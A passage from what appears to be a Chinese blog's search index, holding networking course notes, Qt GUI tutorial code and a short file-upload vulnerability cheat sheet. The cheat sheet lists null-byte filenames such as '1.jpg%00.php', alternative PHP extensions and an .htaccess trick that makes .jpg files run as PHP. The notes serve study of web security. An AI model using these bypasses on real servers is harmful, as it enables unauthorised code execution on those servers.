title=\"0x04数据包\"></a>0x04数据包</h3><p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200619111139014.png\" alt=\"image-20200619111139014\"></p>\n<p>版本：用来表示TCP/IP协议的版本 v4 v6</p>\n<p>区分服务：看谁的优先级高</p>\n<p>标识：100 100 100就为一个数据包</p>\n<p>标志：看数据包是否分片<img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200619112943227.png\" alt=\"image-20200619112943227\"></p>\n<p>生存时间（TTL）：每过一个路由器，生存时间会修改。</p>\n<p>协议号：交给哪个协议进行处理</p>\n<p>（ICMP 1      IGMP  2       TCP  6        UDP  17  IPv6   41       OSPF   89）</p>\n<p>数据链路层支持数据包1500字节</p>\n<p>IP层支持数据包是65535字节，所以需要分片传输，但一般不会超过1500字节。</p>\n<p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200619111512690.png\" alt=\"image-20200619111512690\"></p>\n<h1 id=\"FTP\"><a href=\"#FTP\" class=\"headerlink\" title=\"FTP\"></a>FTP</h1><p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200807090006669.png\" alt=\"image-20200807090006669\"></p>\n<p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200807090512480.png\" alt=\"image-20200807090512480\"></p>\n<p><strong>Active Mode</strong></p>\n<p>第二信道是服务器主动发起的。</p>\n<p>第一信道是21端口</p>\n<p>第二信道是20端口</p>\n<p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200807100649933.png\" alt=\"image-20200807100649933\"></p>\n<p><strong>Passive</strong></p>\n<p>第一信道是21端口</p>\n<p>第二信道是随机端口</p>\n<p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200807100800469.png\" alt=\"image-20200807100800469\"></p>\n<h1 id=\"Telnet\"><a href=\"#Telnet\" class=\"headerlink\" title=\"Telnet\"></a>Telnet</h1><p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200807145634367.png\" alt=\"image-20200807145634367\"></p>\n<p><strong>telnet</strong>的端口是23端口</p>\n<h1 id=\"SSH\"><a href=\"#SSH\" class=\"headerlink\" title=\"SSH\"></a>SSH</h1><p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200811154248708.png\" alt=\"image-20200811154248708\"></p>\n","categories":["计网"],"tags":["Course"]},{"title":"文件上传","url":"https://pz1o.top/2020/12/09/文件上传/","content":"<h1 id=\"上传漏洞\"><a href=\"#上传漏洞\" class=\"headerlink\" title=\"上传漏洞\"></a>上传漏洞</h1><p><a href=\"https://www.andseclab.com/2018/12/01/%e4%b8%8a%e4%bc%a0%e6%bc%8f%e6%b4%9e%e6%94%bb%e5%87%bb%e6%80%bb%e7%bb%93/\" target=\"_blank\" rel=\"noopener\">https://www.andseclab.com/2018/12/01/%e4%b8%8a%e4%bc%a0%e6%bc%8f%e6%b4%9e%e6%94%bb%e5%87%bb%e6%80%bb%e7%bb%93/</a></p>\n<h2 id=\"0x01基本流程\"><a href=\"#0x01基本流程\" class=\"headerlink\" title=\"0x01基本流程\"></a>0x01基本流程</h2><ol>\n<li>图片是否正常上传。</li>\n<li>图片上传内容是否被感染。（内容替换 抓包改）</li>\n<li>上传的域名是否是目标服务器。</li>\n<li>上传的目录是否支持解析</li>\n</ol>\n<h2 id=\"0x02绕过js\"><a href=\"#0x02绕过js\" class=\"headerlink\" title=\"0x02绕过js\"></a>0x02绕过js</h2><h2 id=\"0x03文件上传空字节\"><a href=\"#0x03文件上传空字节\" class=\"headerlink\" title=\"0x03文件上传空字节\"></a>0x03文件上传空字节</h2><p>抓包的时候 %00</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.jpg%00.php</span><br><span class=\"line\">1.php%00.jpg</span><br></pre></td></tr></table></figure>\n<h2 id=\"0x04文件上传名单验证\"><a href=\"#0x04文件上传名单验证\" class=\"headerlink\" title=\"0x04文件上传名单验证\"></a>0x04文件上传名单验证</h2><p>黑名单：不允许什么上传</p>\n<p>白名单：允许什么上传</p>\n<p>可以尝试php3 php4 php5 phtml，pht使用  或服务器解析漏洞</p>\n<h2 id=\"0x05二次上传\"><a href=\"#0x05二次上传\" class=\"headerlink\" title=\"0x05二次上传\"></a>0x05二次上传</h2><h2 id=\"0x06MIME\"><a href=\"#0x06MIME\" class=\"headerlink\" title=\"0x06MIME\"></a>0x06MIME</h2><p>content-type中表示了文件类型。</p>\n<h2 id=\"0x07解析漏洞\"><a href=\"#0x07解析漏洞\" class=\"headerlink\" title=\"0x07解析漏洞\"></a>0x07解析漏洞</h2><h3 id=\"iis解析漏洞\"><a href=\"#iis解析漏洞\" class=\"headerlink\" title=\"iis解析漏洞\"></a>iis解析漏洞</h3><p><img src=\"/2020/12/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200609194945742.png\" alt=\"image-20200609194945742\"></p>\n<h3 id=\"apache解析漏洞\"><a href=\"#apache解析漏洞\" class=\"headerlink\" title=\"apache解析漏洞\"></a>apache解析漏洞</h3><p><img src=\"/2020/12/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200609195122633.png\" alt=\"image-20200609195122633\"></p>\n<h3 id=\"nginx解析漏洞\"><a href=\"#nginx解析漏洞\" class=\"headerlink\" title=\"nginx解析漏洞\"></a>nginx解析漏洞</h3><p><img src=\"/2020/12/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200609195540127.png\" alt=\"image-20200609195540127\"></p>\n<h3 id=\"net上传\"><a href=\"#net上传\" class=\"headerlink\" title=\".net上传\"></a>.net上传</h3><p><img src=\"/2020/12/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200609200056116.png\" alt=\"image-20200609200056116\"></p>\n<h3 id=\"phtml上传\"><a href=\"#phtml上传\" class=\"headerlink\" title=\"phtml上传\"></a>phtml上传</h3><p>在apache配置文件中添加（httpd.conf）中添加</p>\n<p>AddType application/x-httpd-php.phtml</p>\n<p>这样phtml后缀的文件就会按照php去解析</p>\n<h3 id=\"htaccess上传\"><a href=\"#htaccess上传\" class=\"headerlink\" title=\".htaccess上传\"></a>.htaccess上传</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;Files *.jpg&gt;</span><br><span class=\"line\">ForceType:application&#x2F;x-httpd-php</span><br><span class=\"line\">SetHandler:application&#x2F;x-httpd-php</span><br><span class=\"line\">&lt;&#x2F;Files&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;1.jpg</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">phpinfo();</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&#x2F;&#x2F;会将所有的jpg文件都按照php来解析</span><br></pre></td></tr></table></figure>\n<h2 id=\"0x08双文件上传\"><a href=\"#0x08双文件上传\" class=\"headerlink\" title=\"0x08双文件上传\"></a>0x08双文件上传</h2>","categories":["web"],"tags":["web"]},{"title":"大二程序设计综合实践","url":"https://pz1o.top/2020/12/07/大二程序设计综合实践/","content":"<h1 id=\"程序设计综合实践\"><a href=\"#程序设计综合实践\" class=\"headerlink\" title=\"程序设计综合实践\"></a>程序设计综合实践</h1><p>图形化编程</p>\n<p>这不同语言分数还不太一样，最后用Qt了</p>\n<p>四个星期四个实验，应该问题不大</p>\n<p>趁下次比赛之前把这个实验弄完</p>\n<p>先贴链接</p>\n<p><a href=\"https://www.bilibili.com/video/BV1g4411H78N?from=search&amp;seid=13020735672539057046\" target=\"_blank\" rel=\"noopener\">https://www.bilibili.com/video/BV1g4411H78N?from=search&amp;seid=13020735672539057046</a></p>\n<p>下面尽量用代码和注释介绍基础知识，写得有点乱，可以看b站去学</p>\n<p>主要是自己记录一下知识</p>\n<p>我用的是5.14的 b站应该是5.5的 有些知识会有点出入</p>\n<h1 id=\"Qt\"><a href=\"#Qt\" class=\"headerlink\" title=\"Qt\"></a>Qt</h1><h2 id=\"0x01-创建qt项目\"><a href=\"#0x01-创建qt项目\" class=\"headerlink\" title=\"0x01 创建qt项目\"></a>0x01 创建qt项目</h2><p>安装完成后</p>\n<p><img src=\"/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/811f3f2557606ad0c304488b41000c5f.png\" alt=\"image-20201014194802950\"></p>\n<p>可以先看一下上面这个内容</p>\n<p><img src=\"/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/Qt5%20%E6%A8%A1%E5%9D%97.png\" alt=\"Qt5 模块\"></p>\n<h3 id=\"1-新建项目\"><a href=\"#1-新建项目\" class=\"headerlink\" title=\"1.新建项目\"></a>1.新建项目</h3><p>选第一个</p>\n<p><img src=\"/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207153603804.png\" alt=\"image-20201207153603804\"></p>\n<p>一直默认，直到选类名<img src=\"/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207153634092.png\" alt=\"image-20201207153634092\"></p>\n<p>之后一直默认就可以了</p>\n<p>最终界面如图</p>\n<p><img src=\"/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207153758775.png\" alt=\"image-20201207153758775\"></p>\n<h3 id=\"2-pro文件\"><a href=\"#2-pro文件\" class=\"headerlink\" title=\"2. .pro文件\"></a>2. .pro文件</h3><figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">QT       += core gui  <span class=\"comment\">//包含的模块</span></span><br><span class=\"line\">greaterThan(QT_MAJOR_VERSION, <span class=\"number\">4</span>): QT += widgets <span class=\"comment\">//大于Qt4版本 才包含widget模块</span></span><br><span class=\"line\">TARGET = QtFirst  <span class=\"comment\">//应用程序名  生成的.exe程序名称</span></span><br><span class=\"line\">TEMPLATE = app    <span class=\"comment\">//模板类型    应用程序模板</span></span><br><span class=\"line\">SOURCES += main.cpp\\   <span class=\"comment\">//源文件</span></span><br><span class=\"line\">        mywidget.cpp</span><br><span class=\"line\">HEADERS  += mywidget.h   <span class=\"comment\">//头文件</span></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p><strong><em>\\</em>.pro就是工程文件(project)，它是qmake自动生成的用于生产makefile的配置文件**</strong>。</p>\n</blockquote>\n<h3 id=\"3-main-cpp\"><a href=\"#3-main-cpp\" class=\"headerlink\" title=\"3.main.cpp\"></a>3.main.cpp</h3><figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">\"mainwindow.h\"</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;QApplication&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span> *argv[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//a 应用程序对象 在Qt中 有且仅有一个</span></span><br><span class=\"line\">    <span class=\"function\">QApplication <span class=\"title\">a</span><span class=\"params\">(argc, argv)</span></span>;</span><br><span class=\"line\">    <span class=\"comment\">//窗口对象 MainWindow</span></span><br><span class=\"line\">    MainWindow w;</span><br><span class=\"line\">    <span class=\"comment\">//必须要show方法才可以展示</span></span><br><span class=\"line\">    w.show();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> a.exec();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>解释：</p>\n<ul>\n<li>Qt系统提供的标准类名声明头文件没有.h后缀</li>\n<li>Qt一个类对应一个头文件，类名就是头文件名</li>\n<li>QApplication应用程序类</li>\n<li><ol>\n<li>管理图形用户界面应用程序的控制流和主要设置。</li>\n<li>是Qt的整个后台管理的命脉它<strong>包含主事件循环**</strong>，在其中来自窗口系统和其它资源的<strong>*所有事件处理和调度。它也处理应用程序的初始化和结束</strong>，并且<strong>提供对话管理</strong>。</li>\n<li>对于任何一个使用Qt的图形用户界面应用程序，都正好存在一个QApplication 对象，而不论这个应用程序在同一时间内是不是有0、1、2或更多个窗口。</li>\n</ol>\n</li>\n<li><p>a.exec()</p>\n</li>\n</ul>\n<p>程序进入消息循环，等待对用户输入进行响应。这里main()把控制权转交给Qt，Qt完成事件处理工作，当应用程序退出的时候exec()的值就会返回。<strong>在exec()中，Qt接受并处理用户和系统的事件并且把它们传递给适当的窗口部件。</strong></p>\n<h3 id=\"4-快捷键及命名规范\"><a href=\"#4-快捷键及命名规范\" class=\"headerlink\" title=\"4.快捷键及命名规范\"></a>4.快捷键及命名规范</h3><figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//命名规范 </span></span><br><span class=\"line\"><span class=\"comment\">//类名 首字母大写，单词和单词之间首字母大写</span></span><br><span class=\"line\"><span class=\"comment\">//函数名 首字母小写</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//ctrl + / 注释</span></span><br><span class=\"line\"><span class=\"comment\">//ctrl + r 运行</span></span><br><span class=\"line\"><span class=\"comment\">//ctrl + b 编译</span></span><br><span class=\"line\"><span class=\"comment\">//f1 帮助文档</span></span><br><span class=\"line\"><span class=\"comment\">//ctrl + shift + 上 上移</span></span><br><span class=\"line\"><span class=\"comment\">//ctrl + i 对齐</span></span><br><span class=\"line\"><span class=\"comment\">//f4 切换.cpp 和 .h</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"0x02-新建Qt程序\"><a href=\"#0x02-新建Qt程序\" class=\"headerlink\" title=\"0x02 新建Qt程序\"></a>0x02 新建Qt程序</h2><h3 id=\"1-QPushButton\"><a href=\"#1-QPushButton\" class=\"headerlink\" title=\"1.QPushButton\"></a>1.QPushButton</h3><p>创建按钮</p>\n<p>把下面这段代码复制到widget.cpp</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;QPushButton&gt;</span></span></span><br><span class=\"line\">&#123; </span><br><span class=\"line\">    <span class=\"comment\">//按钮操作</span></span><br><span class=\"line\">\t  <span class=\"comment\">//创建第一个按钮</span></span><br><span class=\"line\">    QPushButton * btn = <span class=\"keyword\">new</span> QPushButton;</span><br><span class=\"line\">    <span class=\"comment\">//show以顶层方式弹出控件</span></span><br><span class=\"line\">    btn-&gt;show(); </span><br><span class=\"line\">    <span class=\"comment\">//设置父亲</span></span><br><span class=\"line\">    btn-&gt;setParent(<span class=\"keyword\">this</span>);</span><br><span class=\"line\">    <span class=\"comment\">//显示文本</span></span><br><span class=\"line\">    btn-&gt;setText(<span class=\"string\">\"第一个\"</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">//此外还有第二种方法进行操作</span></span><br><span class=\"line\">    <span class=\"comment\">//创建第二个按钮</span></span><br><span class=\"line\">    <span class=\"comment\">//按照控件大小创建窗口</span></span><br><span class=\"line\">    QPushButton * btn2 = <span class=\"keyword\">new</span> QPushButton(<span class=\"string\">\"第二个\"</span>,<span class=\"keyword\">this</span>);</span><br><span class=\"line\">    <span class=\"comment\">//移动btn2按钮</span></span><br><span class=\"line\">    btn2-&gt;<span class=\"built_in\">move</span>(<span class=\"number\">100</span>,<span class=\"number\">100</span>);</span><br><span class=\"line\">    <span class=\"comment\">//重置按钮大小</span></span><br><span class=\"line\">    btn2-&gt;resize(<span class=\"number\">50</span>,<span class=\"number\">50</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">//窗口操作</span></span><br><span class=\"line\">    <span class=\"comment\">//重置窗口大小</span></span><br><span class=\"line\">    resize(<span class=\"number\">600</span>,<span class=\"number\">400</span>);</span><br><span class=\"line\">    <span class=\"comment\">//设置固定窗口大小</span></span><br><span class=\"line\">    <span class=\"comment\">//setFixedSize(600,400);</span></span><br><span class=\"line\">    <span class=\"comment\">//设置窗口标题</span></span><br><span class=\"line\">    setWindowTitle(<span class=\"string\">\"计算器\"</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207155120350.png\" alt=\"image-20201207155120350\"></p>\n<h3 id=\"2-对象树\"><a href=\"#2-对象树\" class=\"headerlink\" title=\"2.对象树\"></a>2.对象树</h3><p><img src=\"/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207155310260.png\" alt=\"image-20201207155310260\"></p>\n<p>自己创建一个MyPushButton</p>\n<p>同时继承QPushButton</p>\n<p><img src=\"/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207155345296.png\" alt=\"image-20201207155345296\"></p>\n<p><img src=\"/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207111505680.png\" alt=\"image-20201207111505680\"></p>\n<p><img src=\"/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207111746909.png\" alt=\"image-20201207111746909\"></p>\n<p><img src=\"/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207111806797.png\" alt=\"image-20201207111806797\"></p>\n<p><img src=\"/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207111921782.png\" alt=\"image-20201207111921782\"></p>\n<p>代码如下</p>\n<p><code>mypushbutton.cpp</code></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">\"mypushbutton.h\"</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;QDebug&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">MyPushButton::MyPushButton(QWidget *parent) : QPushButton(parent)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    qDebug() &lt;&lt; <span class=\"string\">\"按钮构造调用\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">MyPushButton::~MyPushButton()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    qDebug() &lt;&lt; <span class=\"string\">\"按钮构造析构\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><code>mypushbutton.h</code></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifndef</span> MYPUSHBUTTON_H</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> MYPUSHBUTTON_H</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;QWidget&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;QPushButton&gt;</span></span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MyPushButton</span> :</span> <span class=\"keyword\">public</span> QPushButton</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    Q_OBJECT</span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">explicit</span> <span class=\"title\">MyPushButton</span><span class=\"params\">(QWidget *parent = <span class=\"literal\">nullptr</span>)</span></span>;</span><br><span class=\"line\">     ~MyPushButton();</span><br><span class=\"line\">signals:</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span> <span class=\"comment\">// MYPUSHBUTTON_H</span></span></span><br></pre></td></tr></table></figure>\n<p><code>widget.cpp</code></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//创建自己按钮对象</span></span><br><span class=\"line\">MyPushButton *btn3 = <span class=\"keyword\">new</span> MyPushButton;</span><br><span class=\"line\">btn3-&gt;show();</span><br><span class=\"line\">btn3-&gt;setParent(<span class=\"keyword\">this</span>);</span><br><span class=\"line\">btn3-&gt;setText(<span class=\"string\">\"我的按钮\"</span>);</span><br><span class=\"line\">btn3-&gt;<span class=\"built_in\">move</span>(<span class=\"number\">200</span>,<span class=\"number\">100</span>);</span><br></pre></td></tr></table></figure>\n<p>图示如下</p>\n<p><img src=\"/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207215449993.png\" alt=\"image-20201207215449993\"></p>\n<h2 id=\"0x03-信号和槽的机制\"><a href=\"#0x03-信号和槽的机制\" class=\"headerlink\" title=\"0x03 信号和槽的机制\"></a>0x03 信号和槽的机制</h2><h3 id=\"1-信号和槽\"><a href=\"#1-信号和槽\" class=\"headerlink\" title=\"1.信号和槽\"></a>1.信号和槽</h3><p><img src=\"/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/Qt%E4%BF%A1%E5%8F%B7%E5%92%8C%E6%A7%BD%20.png\" alt=\"Qt信号和槽 \"></p>\n<p>基本的接口</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;给我的按钮一个关闭窗口的功能</span><br><span class=\"line\">&#x2F;&#x2F;参数1 信号发送者 \t参数2 发送的信号(函数地址)\t 参数3 信号接收者 参数4 处理的槽函数</span><br><span class=\"line\">connect(btn3, &amp;QPushButton::clicked, this, &amp;QWidget::close);</span><br></pre></td></tr></table></figure>\n<h4 id=\"自定义信号和槽\"><a href=\"#自定义信号和槽\" class=\"headerlink\" title=\"自定义信号和槽\"></a><strong>自定义信号和槽</strong></h4><p>自定义信号</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//类的.h文件下</span></span><br><span class=\"line\">signals:</span><br><span class=\"line\">    <span class=\"comment\">//自定义信号 写在signals下</span></span><br><span class=\"line\">    <span class=\"comment\">//返回值是void 只需要声明 不需要实现</span></span><br><span class=\"line\">    <span class=\"comment\">//可以有参数，可以重载</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">rang</span><span class=\"params\">()</span></span>;</span><br></pre></td></tr></table></figure>\n<p>自定义槽</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//类的.文件public中</span></span><br><span class=\"line\"><span class=\"keyword\">public</span></span><br><span class=\"line\">    <span class=\"comment\">//返回值是void 需要声明 需要实现</span></span><br><span class=\"line\">    <span class=\"comment\">//可以有参数，可以重载</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">recv</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//实现在类的.cpp中实现</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">MyPushButton::recv</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    qDebug() &lt;&lt; <span class=\"string\">\"接受成功\"</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>接下来进行一个<strong>小的案例</strong></p>\n<blockquote>\n<p>一个按钮响起之后 程序输出接受成功</p>\n</blockquote>\n<p>我们首先得有两个类</p>\n<ol>\n<li>button</li>\n<li>recv</li>\n</ol>\n<p>然后得有<strong>信号 槽函数 定义槽函数 </strong></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span 